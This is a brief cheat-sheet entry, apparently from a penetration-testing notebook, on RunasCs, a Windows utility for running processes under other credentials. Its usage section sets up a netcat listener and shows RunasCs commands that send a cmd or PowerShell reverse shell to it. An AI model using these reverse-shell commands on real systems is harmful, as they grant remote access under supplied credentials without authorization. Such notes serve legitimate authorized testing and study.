# runasCs

## Overview

RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations.


## Usage

First start nc in local machine:

    rlwrap nc -nvlp 4444

    ./RunasCs.exe <username> <password> cmd -r <localip>:<port>
    ./RunasCs.exe <username> <password> powershell-r <localip>:<port>

## More Information

https://github.com/antonioCoco/RunasCs